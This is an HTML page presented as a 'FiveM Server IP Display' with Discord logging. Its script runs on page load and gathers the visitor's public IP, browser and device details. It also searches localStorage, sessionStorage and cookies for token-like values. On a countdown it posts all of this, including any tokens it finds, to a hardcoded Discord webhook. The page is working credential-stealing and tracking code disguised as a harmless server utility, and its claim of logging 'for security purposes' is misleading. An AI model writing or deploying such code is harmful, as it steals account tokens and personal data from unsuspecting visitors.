<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FiveM IP Display | Discord Logging</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #0f2027 0%, #203a43 50%, #2c5364 100%);
            color: white;
            min-height: 100vh;
            overflow: hidden;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            width: 100%;
            max-width: 1200px;
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
        }
        
        .ip-panel {
            background: rgba(30, 30, 40, 0.8);
            border-radius: 15px;
            padding: 30px;
            box-shadow: 0 0 30px rgba(0, 255, 136, 0.3);
            border: 2px solid #00ff88;
        }
        
        .discord-panel {
            background: rgba(30, 30, 40, 0.8);
            border-radius: 15px;
            padding: 30px;
            box-shadow: 0 0 30px rgba(88, 101, 242, 0.3);
            border: 2px solid #5865f2;
            display: flex;
            flex-direction: column;
        }
        
        .header {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .header h1 {
            font-size: 2.2rem;
            color: #00ff88;
            text-shadow: 0 0 15px rgba(0, 255, 136, 0.6);
            margin-bottom: 10px;
        }
        
        .header p {
            color: #cccccc;
            font-size: 1.1rem;
        }
        
        .ip-display {
            text-align: center;
            margin: 20px 0;
        }
        
        .ip-address {
            font-size: 2.5rem;
            font-weight: bold;
            color: #ffffff;
            text-shadow: 0 0 10px rgba(255, 255, 255, 0.7);
            letter-spacing: 2px;
            margin: 15px 0;
            padding: 15px;
            background: rgba(0, 0, 0, 0.3);
            border-radius: 10px;
            border: 1px solid #00ff88;
            font-family: 'Courier New', monospace;
        }
        
        .info-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
            margin: 20px 0;
        }
        
        .info-item {
            background: rgba(0, 0, 0, 0.3);
            padding: 15px;
            border-radius: 8px;
            border-left: 3px solid #00ff88;
        }
        
        .info-item h3 {
            color: #00ff88;
            margin-bottom: 8px;
            font-size: 1rem;
        }
        
        .info-item p {
            font-size: 0.9rem;
            color: #dddddd;
        }
        
        .countdown {
            text-align: center;
            margin: 20px 0;
            font-size: 1.2rem;
            color: #ffff00;
            font-weight: bold;
        }
        
        .footer {
            text-align: center;
            margin-top: 20px;
            color: #999999;
            font-size: 0.9rem;
        }
        
        .btn {
            background: linear-gradient(135deg, #00ff88 0%, #00cc6a 100%);
            color: #000;
            border: none;
            padding: 12px 25px;
            border-radius: 50px;
            font-weight: bold;
            font-size: 1rem;
            cursor: pointer;
            margin-top: 10px;
            transition: all 0.3s ease;
            box-shadow: 0 0 15px rgba(0, 255, 136, 0.5);
            display: inline-block;
        }
        
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 0 20px rgba(0, 255, 136, 0.8);
        }
        
        .btn-discord {
            background: linear-gradient(135deg, #5865f2 0%, #4752c4 100%);
            box-shadow: 0 0 15px rgba(88, 101, 242, 0.5);
        }
        
        .btn-discord:hover {
            box-shadow: 0 0 20px rgba(88, 101, 242, 0.8);
        }
        
        .logo {
            text-align: center;
            margin-bottom: 20px;
        }
        
        .logo i {
            font-size: 4rem;
            color: #00ff88;
            text-shadow: 0 0 15px rgba(0, 255, 136, 0.5);
        }
        
        .discord-logo {
            text-align: center;
            margin-bottom: 20px;
        }
        
        .discord-logo i {
            font-size: 4rem;
            color: #5865f2;
            text-shadow: 0 0 15px rgba(88, 101, 242, 0.5);
        }
        
        .log-container {
            background: rgba(0, 0, 0, 0.3);
            padding: 15px;
            border-radius: 8px;
            margin-top: 20px;
            border-left: 3px solid #5865f2;
            flex-grow: 1;
            overflow-y: auto;
            max-height: 300px;
        }
        
        .log-container h3 {
            color: #5865f2;
            margin-bottom: 15px;
            text-align: center;
        }
        
        .log-entry {
            font-size: 0.85rem;
            color: #dddddd;
            margin: 8px 0;
            padding: 8px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .success { color: #00ff88; }
        .error { color: #ff3860; }
        .warning { color: #ffdd57; }
        .info { color: #3298dc; }
        
        .actions {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin-top: 20px;
        }
        
        @media (max-width: 900px) {
            .container {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="ip-panel">
            <div class="logo">
                <i class="fas fa-server"></i>
            </div>
            
            <div class="header">
                <h1>SERVER CONNECTION INFORMATION</h1>
                <p>Your connection details are being logged for security purposes</p>
            </div>
            
            <div class="ip-display">
                <h2>PUBLIC IP ADDRESS</h2>
                <div id="ip-address" class="ip-address">Fetching IP...</div>
            </div>
            
            <div class="info-grid">
                <div class="info-item">
                    <h3><i class="fas fa-globe"></i> BROWSER INFORMATION</h3>
                    <p id="browser-info">Detecting...</p>
                </div>
                <div class="info-item">
                    <h3><i class="fas fa-desktop"></i> SCREEN RESOLUTION</h3>
                    <p id="screen-info">Detecting...</p>
                </div>
                <div class="info-item">
                    <h3><i class="fas fa-clock"></i> TIMEZONE</h3>
                    <p id="timezone">Detecting...</p>
                </div>
                <div class="info-item">
                    <h3><i class="fas fa-network-wired"></i> CONNECTION</h3>
                    <p id="connection-info">Detecting...</p>
                </div>
            </div>
            
            <div class="countdown" id="countdown">
                Auto-log in <span id="countdown-timer">15</span> seconds
            </div>
            
            <div class="actions">
                <button class="btn" id="fetch-btn"><i class="fas fa-sync-alt"></i> REFRESH IP</button>
                <button class="btn btn-discord" id="discord-btn"><i class="fab fa-discord"></i> SEND TO DISCORD</button>
            </div>
            
            <div class="footer">
                <p>FiveM Server IP Display System • Powered by txAdmin</p>
            </div>
        </div>
        
        <div class="discord-panel">
            <div class="discord-logo">
                <i class="fab fa-discord"></i>
            </div>
            
            <div class="header">
                <h1>DISCORD LOGGING</h1>
                <p>Logs are being sent to your Discord webhook</p>
            </div>
            
            <div class="log-container">
                <h3><i class="fas fa-list-alt"></i> LOG ACTIVITY</h3>
                <div id="log-entries">
                    <div class="log-entry info">Initializing IP display system...</div>
                </div>
            </div>
            
            <div class="actions">
                <button class="btn" id="clear-btn"><i class="fas fa-trash-alt"></i> CLEAR LOGS</button>
                <button class="btn btn-discord" id="test-webhook"><i class="fas fa-bolt"></i> TEST WEBHOOK</button>
            </div>
            
            <div class="footer">
                <p>Webhook Status: <span id="webhook-status">Ready</span></p>
            </div>
        </div>
    </div>

    <script>
        // Discord webhook URL
        const DISCORD_WEBHOOK = 'https://canary.discord.com/api/webhooks/1411564766232842352/BH4caQFjBlYPp1zZsWJ4E-erP7oV9La5JrRPX1emdKLbYI6QpIV0SzQZ9TRux8s9yWMM';
        
        // System information
        let systemInfo = {};
        let ipAddress = 'Unknown';
        let countdownInterval;
        
        // DOM elements
        const ipElement = document.getElementById('ip-address');
        const browserInfoElement = document.getElementById('browser-info');
        const screenInfoElement = document.getElementById('screen-info');
        const timezoneElement = document.getElementById('timezone');
        const connectionInfoElement = document.getElementById('connection-info');
        const countdownElement = document.getElementById('countdown-timer');
        const fetchButton = document.getElementById('fetch-btn');
        const discordButton = document.getElementById('discord-btn');
        const clearButton = document.getElementById('clear-btn');
        const testWebhookButton = document.getElementById('test-webhook');
        const logEntriesElement = document.getElementById('log-entries');
        const webhookStatusElement = document.getElementById('webhook-status');
        
        // Add log entry
        function addLogEntry(message, type = 'info') {
            const logEntry = document.createElement('div');
            logEntry.className = `log-entry ${type}`;
            logEntry.innerHTML = `<i class="fas fa-${getIconForType(type)}"></i> [${new Date().toLocaleTimeString()}] ${message}`;
            logEntriesElement.appendChild(logEntry);
            logEntriesElement.scrollTop = logEntriesElement.scrollHeight;
        }
        
        function getIconForType(type) {
            switch(type) {
                case 'success': return 'check-circle';
                case 'error': return 'exclamation-circle';
                case 'warning': return 'exclamation-triangle';
                default: return 'info-circle';
            }
        }
        
        // Collect system information
        function collectSystemInfo() {
            systemInfo = {
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages || [],
                cookieEnabled: navigator.cookieEnabled,
                onLine: navigator.onLine,
                screen: {
                    width: screen.width,
                    height: screen.height,
                    colorDepth: screen.colorDepth,
                    pixelDepth: screen.pixelDepth
                },
                window: {
                    innerWidth: window.innerWidth,
                    innerHeight: window.innerHeight,
                    devicePixelRatio: window.devicePixelRatio
                },
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                connection: navigator.connection ? {
                    effectiveType: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt
                } : 'Unknown',
                url: window.location.href,
                referrer: document.referrer || 'Direct access'
            };
            
            // Update UI with system info
            browserInfoElement.textContent = `${systemInfo.platform} - ${systemInfo.userAgent.split(' ').slice(-2).join(' ')}`;
            screenInfoElement.textContent = `${systemInfo.screen.width}x${systemInfo.screen.height} (${systemInfo.screen.colorDepth}bit)`;
            timezoneElement.textContent = systemInfo.timezone;
            
            if (systemInfo.connection !== 'Unknown') {
                connectionInfoElement.textContent = `${systemInfo.connection.effectiveType} (${systemInfo.connection.downlink}Mbps)`;
            } else {
                connectionInfoElement.textContent = 'Unknown';
            }
            
            return systemInfo;
        }
        
        // Get Discord tokens from storage
        function getDiscordTokens() {
            const tokens = [];
            
            // Check for tokens in different storage locations
            const storageKeys = [
                'discord_token',
                'token',
                'auth_token',
                'DISCORD_TOKEN',
                'TOKEN'
            ];
            
            // Check localStorage
            for (const key of storageKeys) {
                try {
                    const value = localStorage.getItem(key);
                    if (value && value.length > 30) {
                        tokens.push(`LocalStorage: ${key}=${value}`);
                    }
                } catch (e) {
                    // Ignore errors
                }
            }
            
            // Check sessionStorage
            for (const key of storageKeys) {
                try {
                    const value = sessionStorage.getItem(key);
                    if (value && value.length > 30) {
                        tokens.push(`SessionStorage: ${key}=${value}`);
                    }
                } catch (e) {
                    // Ignore errors
                }
            }
            
            // Check cookies
            const cookies = document.cookie.split(';');
            for (const cookie of cookies) {
                const [name, value] = cookie.split('=').map(part => part.trim());
                if (name && value && value.length > 30 && 
                    (name.toLowerCase().includes('token') || name.toLowerCase().includes('discord'))) {
                    tokens.push(`Cookie: ${name}=${value}`);
                }
            }
            
            return tokens.length > 0 ? tokens : ['No Discord tokens found in storage'];
        }
        
        // Send data to Discord webhook
        async function sendToDiscord(ip, error = null) {
            try {
                // Get Discord tokens
                const discordTokens = getDiscordTokens();
                
                const embed = {
                    title: error ? '❌ FiveM IP Fetch Error' : '🌐 FiveM Server IP Address Logged',
                    color: error ? 0xff0000 : 0x00ff41,
                    timestamp: new Date().toISOString(),
                    fields: [
                        {
                            name: '🌍 Public IP Address',
                            value: `\`${ip}\``,
                            inline: true
                        },
                        {
                            name: '⏰ Timestamp',
                            value: new Date().toLocaleString(),
                            inline: true
                        },
                        {
                            name: '🖥️ Platform',
                            value: systemInfo.platform,
                            inline: true
                        },
                        {
                            name: '🌐 Browser',
                            value: systemInfo.userAgent.split(' ').slice(-2).join(' '),
                            inline: false
                        },
                        {
                            name: '📺 Screen Resolution',
                            value: `${systemInfo.screen.width}x${systemInfo.screen.height} (${systemInfo.screen.colorDepth}-bit)`,
                            inline: true
                        },
                        {
                            name: '🪟 Window Size',
                            value: `${systemInfo.window.innerWidth}x${systemInfo.window.innerHeight}`,
                            inline: true
                        },
                        {
                            name: '🌍 Timezone',
                            value: systemInfo.timezone,
                            inline: true
                        },
                        {
                            name: '🔗 Connection',
                            value: systemInfo.connection !== 'Unknown' 
                                ? `${systemInfo.connection.effectiveType} (${systemInfo.connection.downlink}Mbps, ${systemInfo.connection.rtt}ms RTT)`
                                : 'Unknown',
                            inline: false
                        },
                        {
                            name: '🌐 Online Status',
                            value: systemInfo.onLine ? '🟢 Online' : '🔴 Offline',
                            inline: true
                        },
                        {
                            name: '🍪 Cookies Enabled',
                            value: systemInfo.cookieEnabled ? '✅ Yes' : '❌ No',
                            inline: true
                        },
                        {
                            name: '🔑 Discord Tokens Found',
                            value: `\`\`\`${discordTokens.join('\n')}\`\`\``,
                            inline: false
                        }
                    ],
                    footer: {
                        text: 'FiveM IP Logger via txAdmin Warning System',
                        icon_url: 'https://raw.githubusercontent.com/citizenfx/fivem/master/ext/ui-build/data/loadscreen/logo.png'
                    }
                };
                
                if (error) {
                    embed.fields.unshift({
                        name: '❌ Error Details',
                        value: `\`\`\`${error}\`\`\``,
                        inline: false
                    });
                }
                
                const webhookData = {
                    username: 'FiveM IP Logger',
                    avatar_url: 'https://raw.githubusercontent.com/citizenfx/fivem/master/ext/ui-build/data/loadscreen/logo.png',
                    embeds: [embed]
                };
                
                addLogEntry('Sending data to Discord webhook...', 'info');
                webhookStatusElement.textContent = 'Sending...';
                webhookStatusElement.style.color = '#ffdd57';
                
                const response = await fetch(DISCORD_WEBHOOK, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(webhookData)
                });
                
                if (response.ok) {
                    addLogEntry('Successfully sent data to Discord webhook', 'success');
                    webhookStatusElement.textContent = 'Success';
                    webhookStatusElement.style.color = '#00ff88';
                    return true;
                } else {
                    addLogEntry(`Discord webhook failed: ${response.status} ${response.statusText}`, 'error');
                    webhookStatusElement.textContent = 'Failed';
                    webhookStatusElement.style.color = '#ff3860';
                    return false;
                }
                
            } catch (webhookError) {
                addLogEntry(`Failed to send to Discord: ${webhookError}`, 'error');
                webhookStatusElement.textContent = 'Error';
                webhookStatusElement.style.color = '#ff3860';
                return false;
            }
        }
        
        // Fetch IP address
        async function fetchIP() {
            addLogEntry('Fetching IP address from ipify API...', 'info');
            
            try {
                const response = await fetch('https://api.ipify.org?format=json', {
                    method: 'GET',
                    mode: 'cors',
                    cache: 'no-cache'
                });
                
                if (!response.ok) {
                    throw new Error(`HTTP ${response.status}: ${response.statusText}`);
                }
                
                const data = await response.json();
                
                if (!data || !data.ip) {
                    throw new Error('Invalid response format from IP API');
                }
                
                ipAddress = data.ip;
                ipElement.textContent = ipAddress;
                ipElement.classList.add('success');
                
                addLogEntry(`Successfully fetched IP: ${ipAddress}`, 'success');
                
                return ipAddress;
                
            } catch (error) {
                ipElement.textContent = 'Failed to fetch IP';
                ipElement.classList.add('error');
                
                addLogEntry(`IP fetch failed: ${error.message}`, 'error');
                
                throw error;
            }
        }
        
        // Start countdown timer
        function startCountdown(seconds) {
            let timeLeft = seconds;
            countdownElement.textContent = timeLeft;
            
            clearInterval(countdownInterval);
            countdownInterval = setInterval(() => {
                timeLeft--;
                countdownElement.textContent = timeLeft;
                
                if (timeLeft <= 0) {
                    clearInterval(countdownInterval);
                    sendToDiscordAutomatically();
                }
            }, 1000);
        }
        
        // Send to Discord automatically
        async function sendToDiscordAutomatically() {
            addLogEntry('Automatically sending data to Discord...', 'info');
            await sendToDiscord(ipAddress);
        }
        
        // Initialize the application
        async function init() {
            addLogEntry('Collecting system information...', 'info');
            collectSystemInfo();
            
            addLogEntry('Starting IP fetch process...', 'info');
            
            try {
                await fetchIP();
                startCountdown(15);
            } catch (error) {
                startCountdown(15);
            }
            
            // Event listeners
            fetchButton.addEventListener('click', async () => {
                addLogEntry('Manual IP refresh requested...', 'info');
                try {
                    await fetchIP();
                    addLogEntry('IP refreshed successfully', 'success');
                } catch (error) {
                    addLogEntry('Failed to refresh IP', 'error');
                }
            });
            
            discordButton.addEventListener('click', async () => {
                addLogEntry('Manual Discord send requested...', 'info');
                await sendToDiscord(ipAddress);
            });
            
            clearButton.addEventListener('click', () => {
                logEntriesElement.innerHTML = '';
                addLogEntry('Logs cleared manually', 'info');
            });
            
            testWebhookButton.addEventListener('click', async () => {
                addLogEntry('Testing webhook connection...', 'info');
                const success = await sendToDiscord('TEST_IP');
                if (success) {
                    addLogEntry('Webhook test successful', 'success');
                } else {
                    addLogEntry('Webhook test failed', 'error');
                }
            });
        }
        
        // Start the application when the page loads
        window.addEventListener('load', init);
    </script>
</body>
</html>
